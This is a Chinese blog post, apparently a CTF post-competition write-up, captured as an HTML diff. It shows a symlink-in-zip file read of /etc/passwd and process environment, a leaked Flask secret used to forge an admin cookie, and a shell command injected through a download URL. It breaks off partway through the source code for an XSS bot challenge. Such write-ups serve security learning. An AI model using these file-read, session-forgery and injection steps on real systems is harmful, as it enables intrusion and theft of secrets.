@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+  <title>n1-ctf-赛后复现 | Diver&#39;s blog</title>
+  <link rel="canonical" href="https://swordreforge.github.io/2025/10/05/n1-ctf/">
+  <meta name="author" content="Diver" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="online_unzipper(100%)1.打软连接┌──(swordreforge㉿swordreforge)-[]└─$ ln &#x2F;etc&#x2F;passwd test┌──(swordreforge㉿swordreforge)-[]└─$ zip –symlinks test.zip passwd 123以下方法可获得：envln &#x2F;proc&#x2F;self&#x2F;environ test">
+<meta property="og:type" content="article">
+<meta property="og:title" content="n1-ctf-赛后复现">
+<meta property="og:url" content="https://swordreforge.github.io/2025/10/05/n1-ctf/index.html">
+<meta property="og:site_name" content="Diver&#39;s blog">
+<meta property="og:description" content="online_unzipper(100%)1.打软连接┌──(swordreforge㉿swordreforge)-[]└─$ ln &#x2F;etc&#x2F;passwd test┌──(swordreforge㉿swordreforge)-[]└─$ zip –symlinks test.zip passwd 123以下方法可获得：envln &#x2F;proc&#x2F;self&#x2F;environ test">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://swordreforge.github.io/img/_resources/%E6%88%AA%E5%9B%BE_2025-09-13_17-58-05.png">
+<meta property="og:image" content="https://swordreforge.github.io/img/_resources/76eef7d6db2150b86f5b8f78960116a6.png">
+<meta property="og:image" content="https://swordreforge.github.io/img/_resources/06b320bd4f3da8adcb435ecb779168a5.png">
+<meta property="article:published_time" content="2025-10-05T05:52:10.268Z">
+<meta property="article:modified_time" content="2025-10-05T05:52:10.268Z">
+<meta property="article:author" content="Diver">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://swordreforge.github.io/img/_resources/%E6%88%AA%E5%9B%BE_2025-09-13_17-58-05.png">
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kr-core.min.css" media="all"></link>
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/highlight.js/night-eighties.min.css" media="all"></link>
+  
+  <link rel="stylesheet" id="theme-light-css" href="/css/kr-theme/light.min.css" media="all"></link>
+  <link rel="stylesheet" id="theme-dark-css" href="/css/kr-theme/dark.min.css" media="(prefers-color-scheme: dark)"></link>
+  <script src="/js/kr-theme.min.js"></script>
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></link>
+  
+    <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></link>
+  
+  
+    <link rel="stylesheet" href="/vendors/viewerjs@1.11.6/dist/viewer.min.css"></link>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  
+    <script src="/vendors/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
+  
+  <!-- 自定义站点横幅和背景 -->
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('https://dev.krt.moe/demo-assets/banner.webp');
+      }
+      html[data-theme="dark"] .kratos-cover.kratos-cover-2 {
+        background-image: url('https://dev.krt.moe/demo-assets/banner_dark.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
+        }
+        html[data-theme="dark"] body.custom-background {
+          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
+        }
+      }
+    
+    
+      .widget-kratos-about .photo-background {
+        background-image: url('/images/default.webp');
+      }
+      html[data-theme="dark"] .widget-kratos-about .photo-background {
+        background-image: url('/images/default.webp');
+      }
+    
+  </style>
+
+  <!-- 额外的追加注入项 -->
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    <li>
+                                        
+                                            <a href="/">
+                                        
+                                            
+                                                <i class="fa fa-home"></i>
+                                            
+                                            首页
+                                        </a>
+                                        
+                                    </li>
+                                
+                                    <li>
+                                        
+                                            <a href="/archives/">
+                                        
+                                            
+                                                <i class="fa fa-file"></i>
+                                            
+                                            文章
+                                        </a>
+                                        
+                                    </li>
+                                
+                                    <li>
+                                        
+                                            <a>
+                                        
+                                            
+                                                <i class="fa fa-link"></i>
+                                            
+                                            链接
+                                        </a>
+                                        
+                                            <ul class="sub-menu">
+                                                
+                                                    <li>
+                                                        <a target="_blank" rel="noopener" href="https://github.com/Candinya/Kratos-Rebirth">
+                                                            
+                                                                <i class="fa fa-code"></i>
+                                                            
+                                                            代码仓库
+                                                        </a>
+                                                    </li>
+                                                
+                                                    <li>
+                                                        <a target="_blank" rel="noopener" href="https://wiki.krt.moe">
+                                                            
+                                                                <i class="fa fa-book"></i>
+                                                            
+                                                            项目文档
+                                                        </a>
+                                                    </li>
+                                                
+                                            </ul>
+                                        
+                                    </li>
+                                
+                                    <li class="right">
+                                        
+                                            <a href="/linklist-example/">
+                                        
+                                            
+                                                <i class="fa fa-link"></i>
+                                            
+                                            友链
+                                        </a>
+                                        
+                                    </li>
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Diver&#39;s blog</a></div>
+                    <div id="kratos-nav-toggle-wrapper" class="nav-toggle">
+                        <a id="kratos-nav-toggle" class="kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Diver&#39;s blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+
+
+        
+
+            
+
+            <section class="kr-main-col col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://swordreforge.github.io/2025/10/05/n1-ctf/">
+    <div class="kratos-hentry kratos-page-inner clearfix">
+        <header class="kratos-page-header">
+            
+                <h1 class="kratos-page-title text-center" itemprop="name headline">n1-ctf-赛后复现</h1>
+            
+            <ul class="kratos-page-meta text-center">
+                <li><time datetime="2025-10-05T05:52:10.268Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2025-10-05</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Diver</span>
+                </li>
+                
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            ~33.23K
+                        
+                        字
+                    </li>
+                
+                
+                
+            </ul>
+        </header>
+        <div class="kratos-page-content kr-post">
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><h1 id="online-unzipper-100"><a href="#online-unzipper-100" class="headerlink" title="online_unzipper(100%)"></a>online_unzipper(100%)</h1><p>1.打软连接<br>┌──(swordreforge㉿swordreforge)-[<del>]<br>└─$ ln &#x2F;etc&#x2F;passwd test<br>┌──(swordreforge㉿swordreforge)-[</del>]<br>└─$ zip –symlinks test.zip passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以下方法可获得：env</span><br><span class="line">ln /proc/self/environ test这是链接系统运行时的环境变量</span><br><span class="line">zip --symlinks test.zip passwd</span><br></pre></td></tr></table></figure>
+
+<p>正常上传，下载<br>这样就会下载到文件了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">CTF_GO_PORT_1235_TCP_PROTO=tcp</span><br><span class="line">BLUEHATCUP_LANDING_PORT_80_TCP=tcp://<span class="number">192.168</span><span class="number">.61</span><span class="number">.162</span>:<span class="number">80</span></span><br><span class="line">CONSOLE_WEB_PORT=tcp://<span class="number">192.168</span><span class="number">.136</span><span class="number">.246</span>:80CONSOLE_WEB_SERVICE_PORT=<span class="number">80</span></span><br><span class="line">CTF_GO_SERVICE_HOST=<span class="number">192.168</span><span class="number">.209</span><span class="number">.132</span></span><br><span class="line">KUBERNETES_SERVICE_PORT=<span class="number">443</span></span><br><span class="line">KUBERNETES_PORT=tcp://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span></span><br><span class="line">GATEWAY_PORT_3000_TCP_PORT=<span class="number">3000</span></span><br><span class="line">GATEWAY_PORT_3000_TCP_PROTO=tcp</span><br><span class="line">HOSTNAME=t87281457269073132-comp-online-unziper-<span class="number">92938884492584244</span></span><br><span class="line">vm87xBOSS_WEB_PORT_80_TCP_ADDR=<span class="number">192.168</span><span class="number">.46</span><span class="number">.124</span></span><br><span class="line">CTF_EXPOSED_SERVICE_PORT=<span class="number">1236</span></span><br><span class="line">CTF_EXPOSED_PORT=tcp://<span class="number">192.168</span><span class="number">.111</span><span class="number">.190</span>:<span class="number">1236</span></span><br><span class="line">CTF_DASHBOARD_PORT_80_TCP_ADDR=<span class="number">192.168</span><span class="number">.197</span><span class="number">.106</span></span><br><span class="line">GATEWAY_SERVICE_PORT_HTTP=<span class="number">3000</span></span><br><span class="line">CTF_EXPOSED_PORT_1236_TCP=tcp://<span class="number">192.168</span><span class="number">.111</span><span class="number">.190</span>:<span class="number">1236</span></span><br><span class="line">PORTAL_WEB_PORT_80_TCP=tcp://<span class="number">192.168</span><span class="number">.231</span><span class="number">.235</span>:<span class="number">80</span></span><br><span class="line">CTF_EXPOSED_SERVICE_PORT_TCP_1236=<span class="number">1236</span></span><br><span class="line">CONSOLE_WEB_PORT_80_TCP_ADDR=<span class="number">192.168</span><span class="number">.136</span><span class="number">.246</span></span><br><span class="line">HOME=/root</span><br><span class="line">BOSS_WEB_PORT_80_TCP_PORT=<span class="number">80</span></span><br><span class="line">BLUEHATCUP_LANDING_SERVICE_PORT_HTTP=<span class="number">80</span></span><br><span class="line">CTF_GO_PORT_1234_TCP=tcp://<span class="number">192.168</span><span class="number">.209</span><span class="number">.132</span>:<span class="number">1234</span></span><br><span class="line">CTF_GO_PORT_1235_TCP=tcp://<span class="number">192.168</span><span class="number">.209</span><span class="number">.132</span>:<span class="number">1235</span></span><br><span class="line">CTF_DASHBOARD_PORT_80_TCP_PORT=80BOSS_WEB_PORT_80_TCP_PROTO=tcp</span><br><span class="line">CTF_GO_SERVICE_PORT=<span class="number">1234</span></span><br><span class="line">CTF_GO_PORT=tcp://<span class="number">192.168</span><span class="number">.209</span><span class="number">.132</span>:<span class="number">1234</span></span><br><span class="line">GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D</span><br><span class="line">CTF_DASHBOARD_PORT_80_TCP_PROTO=tcp</span><br><span class="line">CONSOLE_WEB_PORT_80_TCP_PORT=<span class="number">80</span></span><br><span class="line">CONSOLE_WEB_PORT_80_TCP_PROTO=tcp</span><br><span class="line">PYTHON_SHA256=8fb5f9fbc7609fa822cb31549884575db7fd9657cbffb89510b5d7975963a83a</span><br><span class="line">GATEWAY_PORT_3000_TCP=tcp://<span class="number">192.168</span><span class="number">.221</span><span class="number">.45</span>:<span class="number">3000</span></span><br><span class="line">BOSS_PORT_3000_TCP_ADDR=<span class="number">192.168</span><span class="number">.145</span><span class="number">.210</span></span><br><span class="line">PORTAL_WEB_SERVICE_PORT_HTTP=<span class="number">80</span></span><br><span class="line">GATEWAY_SERVICE_HOST=<span class="number">192.168</span><span class="number">.221</span><span class="number">.45</span></span><br><span class="line">BLUEHATCUP_LANDING_SERVICE_HOST=<span class="number">192.168</span><span class="number">.61</span><span class="number">.162</span></span><br><span class="line">FLASK_APP=app.py</span><br><span class="line">BOSS_PORT_3000_TCP_PORT=<span class="number">3000</span></span><br><span class="line">BOSS_WEB_PORT_80_TCP=tcp://<span class="number">192.168</span><span class="number">.46</span><span class="number">.124</span>:<span class="number">80</span></span><br><span class="line">BOSS_PORT_3000_TCP_PROTO=tcp</span><br><span class="line">CTF_DASHBOARD_PORT_80_TCP=tcp://<span class="number">192.168</span><span class="number">.197</span><span class="number">.106</span>:<span class="number">80</span></span><br><span class="line">CONSOLE_WEB_PORT_80_TCP=tcp://<span class="number">192.168</span><span class="number">.136</span><span class="number">.246</span>:<span class="number">80</span></span><br><span class="line">FLASK_RUN_HOST=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">PORTAL_WEB_SERVICE_HOST=<span class="number">192.168</span><span class="number">.231</span><span class="number">.235</span></span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">GATEWAY_PORT=tcp://<span class="number">192.168</span><span class="number">.221</span><span class="number">.45</span>:<span class="number">3000</span></span><br><span class="line">GATEWAY_SERVICE_PORT=<span class="number">3000</span></span><br><span class="line">PATH=/usr/local/<span class="built_in">bin</span>:/usr/local/sbin:/usr/local/<span class="built_in">bin</span>:/usr/sbin:/usr/<span class="built_in">bin</span>:/sbin:/<span class="built_in">bin</span></span><br><span class="line">CLOUDPILOT_PORT_8000_TCP_ADDR=<span class="number">192.168</span><span class="number">.213</span><span class="number">.82</span></span><br><span class="line">BLUEHATCUP_LANDING_SERVICE_PORT=<span class="number">80</span></span><br><span class="line">BLUEHATCUP_LANDING_PORT=tcp://<span class="number">192.168</span><span class="number">.61</span><span class="number">.162</span>:<span class="number">80</span></span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=<span class="number">443</span></span><br><span class="line">BOSS_WEB_SERVICE_PORT_HTTP=<span class="number">80</span></span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcpLANG=C.UTF-<span class="number">8</span></span><br><span class="line">CLOUDPILOT_PORT_8000_TCP_PORT=<span class="number">8000</span></span><br><span class="line">BOSS_PORT_3000_TCP=tcp://<span class="number">192.168</span><span class="number">.145</span><span class="number">.210</span>:<span class="number">3000</span></span><br><span class="line">CTF_DASHBOARD_SERVICE_PORT_HTTP=<span class="number">80</span></span><br><span class="line">CONSOLE_WEB_SERVICE_PORT_HTTP=<span class="number">80</span></span><br><span class="line">BOSS_SERVICE_HOST=<span class="number">192.168</span><span class="number">.145</span><span class="number">.210</span></span><br><span class="line">CLOUDPILOT_PORT_8000_TCP_PROTO=tcp</span><br><span class="line">FLASK_SECRET_KEY=<span class="comment">#mu0cw9F#7bBCoF!</span></span><br><span class="line">PORTAL_WEB_SERVICE_PORT=<span class="number">80</span></span><br><span class="line">PORTAL_WEB_PORT=tcp://<span class="number">192.168</span><span class="number">.231</span><span class="number">.235</span>:<span class="number">80</span></span><br><span class="line">BLUEHATCUP_LANDING_PORT_80_TCP_ADDR=<span class="number">192.168</span><span class="number">.61</span><span class="number">.162</span></span><br><span class="line">PYTHON_VERSION=<span class="number">3.11</span><span class="number">.13</span></span><br><span class="line">CTF_GO_SERVICE_PORT_FRONT=<span class="number">1235</span></span><br><span class="line">CLOUDPILOT_SERVICE_HOST=<span class="number">192.168</span><span class="number">.213</span><span class="number">.82</span></span><br><span class="line">BOSS_WEB_SERVICE_HOST=<span class="number">192.168</span><span class="number">.46</span><span class="number">.124</span></span><br><span class="line">BLUEHATCUP_LANDING_PORT_80_TCP_PORT=<span class="number">80</span></span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span></span><br><span class="line">BLUEHATCUP_LANDING_PORT_80_TCP_PROTO=tcp</span><br><span class="line">CTF_DASHBOARD_SERVICE_HOST=<span class="number">192.168</span><span class="number">.197</span><span class="number">.106</span></span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=<span class="number">443</span></span><br><span class="line">BOSS_PORT=tcp://<span class="number">192.168</span><span class="number">.145</span><span class="number">.210</span>:<span class="number">3000</span></span><br><span class="line">PORTAL_WEB_PORT_80_TCP_ADDR=<span class="number">192.168</span><span class="number">.231</span><span class="number">.235</span></span><br><span class="line">BOSS_SERVICE_PORT=<span class="number">3000</span></span><br><span class="line">CTF_EXPOSED_PORT_1236_TCP_ADDR=<span class="number">192.168</span><span class="number">.111</span><span class="number">.190</span></span><br><span class="line">CONSOLE_WEB_SERVICE_HOST=<span class="number">192.168</span><span class="number">.136</span><span class="number">.246</span></span><br><span class="line">KUBERNETES_SERVICE_HOST=<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">CLOUDPILOT_PORT_8000_TCP=tcp://<span class="number">192.168</span><span class="number">.213</span><span class="number">.82</span>:<span class="number">8000</span></span><br><span class="line">PWD=/app</span><br><span class="line">CTF_GO_PORT_1234_TCP_ADDR=<span class="number">192.168</span><span class="number">.209</span><span class="number">.132</span></span><br><span class="line">CTF_GO_PORT_1235_TCP_ADDR=<span class="number">192.168</span><span class="number">.209</span><span class="number">.132</span></span><br><span class="line">PORTAL_WEB_PORT_80_TCP_PORT=<span class="number">80</span></span><br><span class="line">CTF_EXPOSED_PORT_1236_TCP_PORT=<span class="number">1236</span></span><br><span class="line">CTF_GO_SERVICE_PORT_ADMIN=<span class="number">1234</span></span><br><span class="line">CLOUDPILOT_SERVICE_PORT=<span class="number">8000</span></span><br><span class="line">CTF_EXPOSED_PORT_1236_TCP_PROTO=tcp</span><br><span class="line">PORTAL_WEB_PORT_80_TCP_PROTO=tcp</span><br><span class="line">CTF_EXPOSED_SERVICE_HOST=<span class="number">192.168</span><span class="number">.111</span><span class="number">.190</span></span><br><span class="line">CLOUDPILOT_PORT=tcp://<span class="number">192.168</span><span class="number">.213</span><span class="number">.82</span>:<span class="number">8000</span></span><br><span class="line">BOSS_WEB_PORT=tcp://<span class="number">192.168</span><span class="number">.46</span><span class="number">.124</span>:<span class="number">80</span></span><br><span class="line">CLOUDPILOT_SERVICE_PORT_API=<span class="number">8000</span></span><br><span class="line">BOSS_WEB_SERVICE_PORT=<span class="number">80</span></span><br><span class="line">CTF_GO_PORT_1234_TCP_PORT=<span class="number">1234</span></span><br><span class="line">BOSS_SERVICE_PORT_WEB=<span class="number">3000</span></span><br><span class="line">FLAG=</span><br><span class="line">CTF_GO_PORT_1234_TCP_PROTO=</span><br><span class="line">tcpGATEWAY_PORT_3000_TCP_ADDR=<span class="number">192.168</span><span class="number">.221</span><span class="number">.45</span></span><br><span class="line">CTF_GO_PORT_1235_TCP_PORT=<span class="number">1235</span></span><br><span class="line">CTF_DASHBOARD_SERVICE_PORT=<span class="number">80</span></span><br><span class="line">CTF_DASHBOARD_PORT=tcp://<span class="number">192.168</span><span class="number">.197</span><span class="number">.106</span>:<span class="number">80</span> </span><br></pre></td></tr></table></figure>
+
+<p>改一下session<br>┌──(swordreforge㉿swordreforge)-[~]<br>└─$ flask-unsign –sign –cookie “{‘role’: ‘admin’, ‘username’: ‘admin’}” –secret “ #mu0cw9F#7bBCoF! “<br>eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.aMUxug.GBoGLOiK_gczxw0482xAgoacOBo</p>
+<p>2.命令注入<br>用不了,按理说参数可控，可以多行命令执行的但为何无文件<br>有了<br><a target="_blank" rel="noopener" href="http://60.205.163.215:31788/download/4">http://60.205.163.215:31788/download/4</a><br><a target="_blank" rel="noopener" href="http://60.205.163.215:31788/download/5;%60cat%20/f*%20%3E%20/app/uploads/4/4.txt%60">http://60.205.163.215:31788/download/5;`cat &#x2F;f* &gt; &#x2F;app&#x2F;uploads&#x2F;4&#x2F;4.txt`</a>;<br>flag{a3c268c2-ad5d-4117-a195-e0dfed1fd3ec}</p>
+<p><img src="/img/_resources/%E6%88%AA%E5%9B%BE_2025-09-13_17-58-05.png" alt="截图_2025-09-13_17-58-05.png"></p>
+<h1 id="unfinished-60"><a href="#unfinished-60" class="headerlink" title="unfinished(60%)"></a>unfinished(60%)</h1><h2 id="1-赛时思路"><a href="#1-赛时思路" class="headerlink" title="1.赛时思路"></a>1.赛时思路</h2><p>使用了httponly&#x3D;True-&gt;不可使用cookie带出（根据赛后复现该项为httpOlny&#x3D;True会造成非预期），flag在cookie中-&gt;多半是xss or csrf<br>这样就易于想到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找到xss路由-&gt;本地可访问-&gt;http://127.0.0.1:5000/api/bio/a-&gt;漏洞利用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>大致思路：填充路径-&gt;&#x2F;profile<br>机器访问路径 -&gt;&#x2F;api&#x2F;bio&#x2F;你登陆的用户名（注：本地可访问&#x2F;触发xss）ban了但没全ban<br>触发机器路径-&gt;&#x2F;view<br>逻辑验证：<br>为了更方便查看，修改了有关无头浏览器的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, flash, render_template_string, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> LoginManager, UserMixin, login_user, logout_user, current_user, login_required</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;your-secret-key-here&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置日志</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    level=logging.INFO,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>,</span><br><span class="line">    handlers=[</span><br><span class="line">        logging.FileHandler(<span class="string">&#x27;bot_monitor.log&#x27;</span>),</span><br><span class="line">        logging.StreamHandler()</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;BotMonitor&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login_manager = LoginManager()</span><br><span class="line">login_manager.init_app(app)</span><br><span class="line">login_manager.login_view = <span 